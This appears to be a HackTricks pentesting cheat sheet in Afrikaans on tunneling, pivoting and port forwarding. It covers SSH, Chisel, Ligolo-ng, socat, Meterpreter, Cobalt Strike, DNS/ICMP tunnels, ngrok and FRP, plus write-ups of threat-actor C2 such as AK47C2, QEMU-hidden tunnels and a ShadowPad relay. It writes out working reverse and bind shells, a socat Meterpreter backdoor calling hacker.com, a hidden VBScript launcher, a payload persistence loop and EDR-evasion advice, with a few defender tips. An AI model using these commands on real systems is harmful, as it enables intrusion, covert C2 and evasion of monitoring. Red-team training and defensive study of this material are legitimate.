# Tunneling en Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-wenk

> [!WARNING]
> **ICMP**- en **SYN**-skanderings kan nie deur socks-proxies getunnel word nie, daarom moet ons **ping discovery** deaktiveer (`-Pn`) en **TCP-skanderings** spesifiseer (`-sT`) sodat dit werk.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafiese verbinding (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Maak nuwe port in SSH Server oop --> Ander port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Plaaslike poort --> Gekompromitteerde gasheer (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Plaaslike poort --> Gekompromitteerde host (SSH) --> Enige plek
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Dit is nuttig om reverse shells vanaf interne hosts deur ’n DMZ na jou host te kry:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Jy benodig **root op albei toestelle** (aangesien jy nuwe koppelvlakke gaan skep), en die sshd-konfigurasie moet root-aanmelding toelaat:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Aktiveer forwarding aan die Server-kant
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Stel 'n nuwe roete aan die kliëntkant op
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Sekuriteit – Terrapin Attack (CVE-2023-48795)**
> Die 2023 Terrapin downgrade attack kan ’n man-in-the-middle met die vroeë SSH-handdruk laat peuter en data in **enige forwarded channel** ( `-L`, `-R`, `-D` ) inspuit. Maak seker dat beide die client en server gepatch is (**OpenSSH ≥ 9.6/LibreSSH 6.7**) of deaktiveer die kwesbare `chacha20-poly1305@openssh.com`- en `*-etm@openssh.com`-algoritmes uitdruklik in `sshd_config`/`ssh_config` voordat jy op SSH-tunnels staatmaak.

## SSHUTTLE

Jy kan **alle verkeer** via **ssh** na ’n **subnetwerk** deur ’n host **tunnel**.\
Byvoorbeeld, om alle verkeer wat na 10.10.10.0/24 gaan, aan te stuur
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Koppel met 'n private sleutel
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Plaaslike poort --> Gekompromitteerde host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Nog ’n manier:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Maak ’n poort op die teamserver oop wat op alle koppelvlakke luister en gebruik kan word om die verkeer deur die **beacon** te roeteer.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In hierdie geval word die **port op die beacon host oopgemaak**, nie op die Team Server nie, en die traffic word na die Team Server gestuur en van daar af na die aangeduide host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Let wel:

- Beacon se reverse port forward is ontwerp om **verkeer na die Team Server te tonnel, nie om tussen individuele masjiene te relay nie**.
- Verkeer word **binne Beacon se C2-verkeer getonnel**, insluitend P2P-skakels.
- **Admin-voorregte word nie vereis** om reverse port forwards op hoë poorte te skep nie.

### rPort2Port local

> [!WARNING]
> In hierdie geval word die **poort in die beacon-host oopgemaak**, nie in die Team Server nie, en die **verkeer word na die Cobalt Strike-kliënt gestuur** (nie na die Team Server nie) en van daar af na die aangeduide host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Jy moet 'n web file tunnel oplaai: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Jy kan dit vanaf die releases page van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) aflaai\
Jy moet **dieselfde weergawe vir die client en server gebruik**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Gebruik dieselfde weergawe vir agent en proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent-binding en -luister
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Kry toegang tot agent se plaaslike poorte
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Omgekeerde tunnel. Die tunnel word vanaf die slagoffer begin.\
’n socks4-proxy word op 127.0.0.1:1080 geskep
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot deur **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port deur socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter deur SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Jy kan ’n **nie-geoutentiseerde proxy** omseil deur hierdie reël in plaas van die laaste een in die slagoffer se konsole uit te voer:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Skep sertifikate aan beide kante: Client en Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Koppel die plaaslike SSH-poort (22) aan poort 443 op die aanvaller se host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Dit is soos 'n konsoleweergawe van PuTTY (die opsies is baie soortgelyk aan dié van 'n ssh client).

Omdat hierdie binary op die victim uitgevoer sal word en dit 'n ssh client is, moet ons ons ssh-diens en -port oopmaak sodat ons 'n reverse connection kan hê. Om dan slegs 'n plaaslik toeganklike port na 'n port op ons masjien aan te stuur:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Jy moet ’n plaaslike admin wees (vir enige poort)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Jy moet **RDP-toegang oor die stelsel** hê.\
Laai af:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie tool gebruik `Dynamic Virtual Channels` (`DVC`) van die Remote Desktop Service-feature van Windows. DVC is verantwoordelik daarvoor om **pakkette oor die RDP-verbinding te tunnel**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Laai **`SocksOverRDP-Plugin.dll`** soos volg op jou kliëntrekenaar:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nou kan ons aan die **victim** oor **RDP** **verbind** met **`mstsc.exe`**, en ons behoort ’n **prompt** te ontvang wat aandui dat die **SocksOverRDP plugin** geaktiveer is en op **127.0.0.1:1080** sal **listen**.

**Verbind** via **RDP** en laai die `SocksOverRDP-Server.exe`-binary op die victim-masjien en voer dit uit:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bevestig nou op jou masjien (aanvaller) dat poort 1080 luister:
```
netstat -antb | findstr 1080
```
Nou kan jy [**Proxifier**](https://www.proxifier.com/) **gebruik om die verkeer deur daardie poort te proxy.**

## Proxify Windows GUI Apps

Jy kan Windows GUI Apps deur ’n proxy laat navigeer deur [**Proxifier**](https://www.proxifier.com/) te gebruik.\
Voeg die IP en poort van die SOCKS-bediener by onder **Profile -> Proxy Servers**.\
Voeg die naam van die program wat geproksiseer moet word en die verbindings na die IP’s wat jy wil proxy by onder **Profile -> Proxification Rules**.

## NTLM proxy bypass

Die voorheen genoemde tool: **Rpivot**\
**OpenVPN** kan dit ook omseil deur hierdie opsies in die konfigurasielêer te stel:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Dit autentiseer teen 'n proxy en bind 'n poort plaaslik wat aangestuur word na die eksterne diens wat jy spesifiseer. Daarna kan jy die tool van jou keuse deur hierdie poort gebruik.\
Byvoorbeeld, forward poort 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Nou, as jy byvoorbeeld die **SSH**-diens op die slagoffer instel om op poort 443 te luister, kan jy daardeur via aanvallerpoort 2222 koppel.\
Jy kan ook ’n **meterpreter** gebruik wat aan localhost:443 koppel, terwyl die aanvaller op poort 2222 luister.

## YARP

’n reverse proxy wat deur Microsoft geskep is. Jy kan dit hier vind: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root is op albei stelsels nodig om tun adapters te skep en data tussen hulle deur DNS queries te tonnel.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Die tunnel sal baie stadig wees. Jy kan ’n saamgeperste SSH-verbinding deur hierdie tunnel skep deur die volgende te gebruik:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laai dit hier af**](https://github.com/iagox86/dnscat2)**.**

Stel 'n C\&C-kanaal deur DNS op. Dit benodig nie root privileges nie.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) gebruik om ’n dnscat2-client in PowerShell te laat loop:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding met dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Verander proxychains DNS

Proxychains onderskep die `gethostbyname` libc-call en tonnel TCP DNS-versoeke deur die socks-proxy. By verstek is die **DNS**-bediener wat proxychains gebruik **4.2.2.2** (hardcoded). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in ’n **Windows environment** is, kan jy die IP van die **domain controller** instel.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Die Storm-2603-actor het ’n **dual-channel C2 ("AK47C2")** geskep wat *slegs* uitgaande **DNS**- en **plain HTTP POST**-verkeer misbruik – twee protokolle wat selde op korporatiewe netwerke geblokkeer word.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Genereer ’n ewekansige 5-karakter SessionID (bv. `H4T14`).
• Voeg `1` voor vir *task requests* of `2` vir *results* en voeg verskillende velde saam (flags, SessionID, computer name).
• Elke veld word met die ASCII-sleutel `VHBD@H` **XOR-encrypted**, hex-encoded en met punte aanmekaargeheg – en eindig uiteindelik met die attacker-controlled domain:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Versoeke gebruik `DnsQuery()` vir **TXT**- (en fallback **MG**-)records.
• Wanneer die response 0xFF bytes oorskry, **fragmenteer** die backdoor die data in stukke van 63 bytes en voeg die markers in:
`s<SessionID>t<TOTAL>p<POS>` sodat die C2-server hulle kan herrangskik.

2. **HTTP mode (AK47HTTP)**
• Bou ’n JSON-envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Die hele blob word XOR-`VHBD@H` → hex → as die body van ’n **`POST /`** met header `Content-Type: text/plain` gestuur.
• Die reply volg dieselfde encoding en die `cmd`-veld word met `cmd.exe /c <command> 2>&1` uitgevoer.

Blue Team-notas
• Soek na ongewone **TXT queries** waarvan die eerste label lang hexadecimal is en wat altyd met een seldsame domain eindig.
• ’n Konstante XOR-sleutel gevolg deur ASCII-hex is maklik om met YARA te detect: `6?56484244?484` (`VHBD@H` in hex).
• Vir HTTP, flag text/plain POST-bodies wat suiwer hex is en ’n veelvoud van twee bytes bevat.

{{#note}}
Die hele channel pas binne **standard RFC-compliant queries** en hou elke sub-domain-label onder 63 bytes, wat dit in die meeste DNS-logs stealthy maak.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is op albei stelsels nodig om tun-adapters te skep en data tussen hulle te tonnel met behulp van ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laai dit hier af**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **is 'n tool om oplossings met een opdragreël aan die Internet bloot te stel.**\
_ Blootstellings-URI's is soos:_ **UID.ngrok.io**

### Installering

- Skep 'n rekening: https://ngrok.com/signup
- Laai die kliënt af:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Basiese gebruike

**Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Dit is ook moontlik om verifikasie en TLS by te voeg, indien nodig._

#### TCP-tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Lêers met HTTP blootstel
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing van HTTP calls

_Nuttig vir XSS,SSRF,SSTI ..._\
Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling van interne HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml eenvoudige konfigurasievoorbeeld

Dit maak 3 tunnels oop:

- 2 TCP
- 1 HTTP met blootstelling van statiese lêers vanaf /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare se `cloudflared`-daemon kan uitgaande tunnels skep wat **plaaslike TCP/UDP-dienste** blootstel sonder dat inkomende firewall-reëls vereis word, deur Cloudflare se edge as die rendez-vous-punt te gebruik. Dit is baie handig wanneer die egress-firewall slegs HTTPS-verkeer toelaat, maar inkomende verbindings geblokkeer word.

### Vinnige tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Aanhoudende tonnels met DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Begin die connector:
```bash
cloudflared tunnel run mytunnel
```
Omdat alle verkeer die host **uitgaand oor 443** verlaat, is Cloudflared-tonnels 'n eenvoudige manier om ingress-ACL's of NAT-grense te omseil. Wees bewus daarvan dat die binary gewoonlik met verhoogde voorregte loop – gebruik containers of die `--user`-flag waar moontlik.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) is 'n aktief onderhoude Go reverse-proxy wat **TCP, UDP, HTTP/S, SOCKS en P2P NAT-hole-punching** ondersteun. Vanaf **v0.53.0 (Mei 2024)** kan dit as 'n **SSH Tunnel Gateway** optree, sodat 'n teikenhost 'n reverse tunnel kan opstel deur slegs die standaard OpenSSH-client te gebruik – geen ekstra binary word benodig nie.

### Klassieke reverse TCP-tonnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Gebruik die nuwe SSH-gateway (sonder frpc-binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Die bogenoemde opdrag publiseer die slagoffer se poort **8080** as **attacker_ip:9000** sonder om enige addisionele tooling te ontplooi – ideaal vir living-off-the-land pivoting.

## Versteekte VM-gebaseerde Tunnels met QEMU

QEMU se user-mode networking (`-netdev user`) ondersteun ’n opsie genaamd `hostfwd` wat **’n TCP/UDP-poort op die *host* bind en dit na die *guest* aanstuur**. Wanneer die guest ’n volledige SSH-daemon uitvoer, gee die hostfwd-reël jou ’n weggooibare SSH-jump box wat volledig binne ’n ephemeral VM bestaan – perfek om C2-verkeer vir EDR weg te steek, omdat alle kwaadwillige aktiwiteit en lêers in die virtuele skyf bly.<sup>[[1]](#references)</sup>

### Vinnige eenreël-opdrag
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Die opdrag hierbo begin ’n **Tiny Core Linux**-beeld (`tc.qcow2`) in RAM.
• Poort **2222/tcp** op die Windows-host word deursigtig aangestuur na **22/tcp** binne die guest.
• Vanuit die aanvaller se oogpunt stel die target bloot poort 2222 beskikbaar; enige pakkette wat dit bereik, word deur die SSH-server wat in die VM loop, hanteer.

### Stealthy bekendstelling deur VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` keeps the window hidden.

### Volharding binne die guest

Omdat Tiny Core stateless is, doen aanvallers gewoonlik:

1. Drop payload na `/opt/123.out`
2. Voeg by `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Voeg `home/tc` en `opt` by `/opt/filetool.lst` sodat die payload tydens afsluiting in `mydata.tgz` verpak word.

### Waarom dit opsporing ontduik

• Slegs twee ongetekende executables (`qemu-system-*.exe`) skryf na die skyf; geen drivers of services word geïnstalleer nie.
• Security products op die host sien **goedaardige loopback-verkeer** (die werklike C2 eindig binne die VM).
• Memory scanners ontleed nooit die malicious process space nie, omdat dit in ’n ander OS leef.

### Defender-wenke

• Genereer ’n alert vir **onverwagte QEMU/VirtualBox/KVM-binaries** in paaie wat deur gebruikers geskryf kan word.
• Blokkeer outbound connections wat vanaf `qemu-system*.exe` afkomstig is.
• Hunt vir seldsame listening ports (2222, 10022, …) wat onmiddellik ná ’n QEMU-launch bind.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Ink Dragon se ShadowPad IIS-module verander elke compromised perimeter web server in ’n dual-purpose **backdoor + relay** deur covert URL-prefixes direk op die HTTP.sys-laag te bind:<sup>[[3]](#references)</sup>

* **Config defaults** – indien die module se JSON-config waardes weglaat, val dit terug na geloofwaardige IIS-defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Só word benign traffic deur IIS met die korrekte branding beantwoord.
* **Wildcard interception** – operators verskaf ’n semicolon-separated list van URL-prefixes (wildcards in host + path). Die module roep `HttpAddUrl` vir elke entry aan, sodat HTTP.sys matching requests na die malicious handler routeer *voordat* die request IIS-modules bereik.
* **Encrypted first packet** – die eerste twee bytes van die request body bevat die seed vir ’n custom 32-bit PRNG. Elke daaropvolgende byte word met die gegenereerde keystream ge-XOR voordat protocol parsing plaasvind:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – die module handhaaf twee lists: “servers” (upstream nodes) en “clients” (downstream implants). Entries word verwyder indien geen heartbeat binne ongeveer 30 sekondes ontvang word nie. Wanneer albei lists nie leeg is nie, paar dit die eerste healthy server met die eerste healthy client en pipe dit eenvoudig bytes tussen hul sockets totdat een kant sluit.
* **Debug telemetry** – optional logging teken source IP, destination IP en totale forwarded bytes vir elke pairing aan. Investigators het hierdie breadcrumbs gebruik om die ShadowPad-mesh wat oor verskeie victims gestrek het, te rekonstrueer.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
